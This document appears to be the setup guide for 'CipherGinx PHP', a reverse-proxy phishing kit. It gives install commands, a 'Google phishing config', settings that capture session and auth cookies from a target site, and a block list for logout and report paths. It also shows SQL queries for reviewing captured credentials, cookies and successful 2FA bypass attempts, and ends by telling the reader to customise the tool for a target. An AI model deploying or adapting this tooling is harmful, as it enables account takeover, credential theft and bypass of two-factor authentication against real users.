# Setup Guide - CipherGinx PHP

## Quick Start (5 minutes)

### 1. Install PHP Dependencies

```bash
cd cipherginx-php
composer install
```

### 2. Configure Environment

```bash
cp .env.example .env
# Edit .env if using a different MySQL server
```

### 3. Generate SSL Certificate

```bash
mkdir -p certs
openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.pem -days 365 -nodes
```

### 4. Start the Server

```bash
sudo php bin/cipherginx -c example -l debug
```

That's it! The proxy is now listening on `localhost:443`.

---

## Detailed Setup

### System Requirements

- **OS:** Linux (recommended) or macOS
- **PHP:** 8.1 or higher
- **MySQL:** 8.0 or higher (optional, but recommended)
- **Composer:** Latest version
- **OpenSSL:** For certificate generation
- **Privileges:** `sudo` access for port 443

### Step-by-Step Installation

#### 1. Clone Repository

```bash
git clone https://github.com/Chukwuemeka83/cipherginx-php.git
cd cipherginx-php
```

#### 2. Install Composer Dependencies

```bash
composer install
```

This installs:
- **workerman/workerman** — Async TCP server
- **guzzlehttp/guzzle** — HTTP client for forwarding requests
- **monolog/monolog** — Logging framework
- **vlucas/phpdotenv** — Environment variable management

#### 3. Configure Database (Optional)

Edit `.env`:

```env
DB_HOST=localhost
DB_PORT=3306
DB_NAME=cipherginx
DB_USER=root
DB_PASSWORD=your_password
```

Create MySQL database:

```bash
mysql -u root -p -e "CREATE DATABASE cipherginx CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;"
```

#### 4. Generate SSL Certificate

**Option A: Self-signed (Quick)**

```bash
mkdir -p certs
openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.pem -days 365 -nodes
```

**Option B: With Certificate Authority (Recommended)**

```bash
openssl genrsa -out certs/server.key 2048
openssl req -new -key certs/server.key -out certs/server.csr
openssl x509 -req -days 365 -in certs/server.csr -signkey certs/server.key -out certs/server.pem
cat certs/server.key >> certs/server.pem
```

#### 5. Set Permissions

```bash
chmod +x bin/cipherginx
chmod 755 logs certs
chmod 600 certs/server.key
```

#### 6. Verify Installation

```bash
php bin/cipherginx --version
# Output: CipherGinx PHP v2.0
```

---

## Running the Proxy

### Basic Usage

```bash
# Start with example configuration
sudo php bin/cipherginx -c example

# With debug logging
sudo php bin/cipherginx -c example -l debug

# Using Google phishing config
sudo php bin/cipherginx -c google
```

### CLI Options

```
-c, --config <name>    Configuration file name (required)
-l, --log-level <lvl>  Logging level: debug, info, warning, error
-h, --help             Show help message
-v, --version          Show version
```

### Running in Background

```bash
# Using nohup
sudo nohup php bin/cipherginx -c example > logs/cipherginx.log 2>&1 &

# Using screen
sudo screen -S cipherginx php bin/cipherginx -c example

# Using systemd (advanced)
# See systemd-service.md
```

---

## Configuration

### Creating a Target Config

1. Copy example:
```bash
cp config/example.php config/mysite.php
```

2. Edit `config/mysite.php`:

```php
<?php
return [
    'hostname' => 'mysite.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['api.mysite.com', 'api.localhost'],
    ],

    'get_cookie' => [
        'SESSION',
        'AUTH',
    ],
];
```

3. Run it:
```bash
sudo php bin/cipherginx -c mysite
```

### Configuration Options

| Option | Type | Description |
|--------|------|-------------|
| `hostname` | string | Target website domain |
| `isSSL` | bool | Use HTTPS |
| `server` | string | Local bind address |
| `port` | int | Local port (443 needs sudo) |
| `inject_domain` | array | Domain replacements `[[from, to]]` |
| `req_headers` | array | Request header mods `[[path, {headers}]]` |
| `resp_headers` | array | Response header mods |
| `req_body` | array | Request body replacements |
| `resp_body` | array | Response body replacements |
| `block_paths` | array | Paths to block (return 200 OK) |
| `get_cookie` | array | Cookie names to capture |

---

## Database & Logging

### View Captured Data

```bash
# Connect to MySQL
mysql -u root -p cipherginx

# View credentials
SELECT * FROM captured_credentials ORDER BY captured_at DESC LIMIT 10;

# View cookies
SELECT * FROM captured_cookies WHERE name LIKE '%SESSION%';

# View 2FA attempts
SELECT * FROM 2fa_bypass_attempts WHERE success = 1;
```

### Check Logs

```bash
# Real-time logging
tail -f logs/cipherginx.log

# View captured tokens
cat logs/tokens.txt
```

---

## Troubleshooting

### Port 443 Permission Denied

```bash
# Use sudo
sudo php bin/cipherginx -c example

# Or use port 8443 instead (no sudo needed)
# Edit .env: PROXY_PORT=8443
php bin/cipherginx -c example
```

### SSL Certificate Error

```bash
# Verify certificate exists
ls -la certs/server.pem

# Regenerate if corrupted
rm certs/server.pem
openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.pem -days 365 -nodes
```

### Database Connection Failed

```bash
# Test MySQL connection
mysql -u root -p -h localhost

# Check credentials in .env
cat .env | grep DB_

# Ensure database exists
mysql -u root -p -e "SHOW DATABASES LIKE 'cipherginx';"
```

### Composer Autoload Error

```bash
# Regenerate autoloader
composer dump-autoload

# Reinstall dependencies
rm -rf vendor composer.lock
composer install
```

---

## Development

### Running Tests

```bash
composer test
```

### Code Style & Analysis

```bash
# Check code style
composer lint

# Static analysis
composer analyze
```

### Debug Mode

Enable in `.env`:
```env
DEBUG=true
LOG_LEVEL=debug
```

Then run with:
```bash
sudo php bin/cipherginx -c example -l debug
```

---

## Advanced Configuration

### Regex Patterns in Configs

```php
'req_body' => [
    ['/login', '/password=.*/', 'password=REDACTED'],  // Regex pattern
    ['/api/', 'token_old', 'token_new'],               // Literal match
],
```

### Multiple Domain Injection

```php
'inject_domain' => [
    ['cdn.example.com', 'cdn.localhost'],
    ['api.example.com', 'api.localhost'],
    ['www.example.com', 'www.localhost'],
],
```

### Block Sensitive Paths

```php
'block_paths' => [
    '/logout',
    '/account/delete',
    '/report',
    '/api/verify',
],
```

---

## Next Steps

1. ✅ Installation complete
2. 📝 Create your first target config
3. 🧪 Test with example.php
4. 📊 Monitor captured data in MySQL
5. 🔧 Customize for your target

For more help, see:
- [README.md](../README.md) — Project overview
- [ARCHITECTURE.md](./ARCHITECTURE.md) — Code structure
- [CONFIG-REFERENCE.md](./CONFIG-REFERENCE.md) — Detailed config options
